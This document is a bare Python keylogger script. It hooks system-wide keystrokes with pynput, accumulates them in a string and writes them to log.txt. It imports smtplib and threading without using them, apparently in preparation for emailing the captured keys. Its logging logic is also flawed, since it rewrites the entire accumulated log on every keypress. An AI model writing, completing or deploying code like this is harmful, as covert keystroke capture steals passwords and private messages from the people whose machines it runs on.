#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib

log = ""

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    
    with open("log.txt", "a") as file:
        file.write(log)

    print(key)

keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)

with keyboard_listener:
    keyboard_listener.join()
